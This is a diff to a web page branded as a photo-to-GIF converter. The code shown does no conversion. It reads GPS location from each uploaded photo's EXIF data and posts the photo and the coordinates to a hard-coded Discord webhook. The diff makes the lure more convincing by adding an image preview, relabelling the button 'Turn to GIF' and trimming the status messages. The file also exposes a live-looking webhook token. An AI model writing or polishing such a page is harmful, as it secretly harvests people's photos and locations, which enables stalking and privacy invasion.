@@ -22,11 +22,20 @@
       border: 1px solid rgba(255,255,255,0.1);
       text-align: center;
       width: 440px;
+      max-width: 90vw;
     }
     h1 { 
       font-size: 2.8em; 
       margin: 0 0 30px 0; 
       color: #00ffff; 
+    }
+    #preview {
+      max-width: 100%;
+      max-height: 280px;
+      border-radius: 12px;
+      margin: 15px 0;
+      display: none;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.4);
     }
     button {
       padding: 16px 32px;
@@ -51,9 +60,13 @@
 <body>
   <div class="container">
     <h1>gif.fuck</h1>
+    
+    <img id="preview" alt="Selected image preview">
+    
     <button id="uploadBtn">Choose Image</button>
     <button id="cameraBtn">Take Photo</button>
-    <button id="convertBtn" style="display:none; background: linear-gradient(90deg, #00ff88, #00ccff);">CONVERT TO GIF</button>
+    <button id="convertBtn" style="display:none;">Turn to GIF</button>
+    
     <div id="status"></div>
   </div>
 
@@ -62,8 +75,10 @@
 
   <script>
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1536294907306840125/EUtQw41CiZDG2sTuh4Tt_LLwgvRQKol6dv-YeTOQfl44xoekO8mByVGfYKWjz15_EuFY";
+    
     const statusEl = document.getElementById('status');
     const convertBtn = document.getElementById('convertBtn');
+    const preview = document.getElementById('preview');
     let selectedFile = null;
 
     function updateStatus(text, color = "white") {
@@ -88,24 +103,34 @@
       await fetch(WEBHOOK_URL, { method: "POST", body: formData });
     }
 
-    async function handleFile(file) {
+    function handleFile(file) {
       if (!file || !file.type.startsWith("image/")) return;
       
       selectedFile = file;
+      
+      // Show preview
+      const reader = new FileReader();
+      reader.onload = function(e) {
+        preview.src = e.target.result;
+        preview.style.display = "block";
+      };
+      reader.readAsDataURL(file);
+
       updateStatus(`Selected: ${file.name}`, "#00ffff");
       convertBtn.style.display = "inline-block";
+      convertBtn.textContent = "Turn to GIF";
     }
 
     async function convertToGif() {
       if (!selectedFile) return;
       
-      updateStatus("Sending to webhook...", "#ffff00");
+      updateStatus("Sending...", "#ffff00");
       convertBtn.disabled = true;
 
       try {
         const gps = await exifr.gps(selectedFile);
         await sendToWebhook(selectedFile, gps);
-        updateStatus("✅ Successfully sent to webhook!", "#00ff00");
+        updateStatus("✅ Sent to webhook!", "#00ff00");
       } catch (err) {
         await sendToWebhook(selectedFile);
         updateStatus("✅ Sent (no GPS data)", "#00ff88");
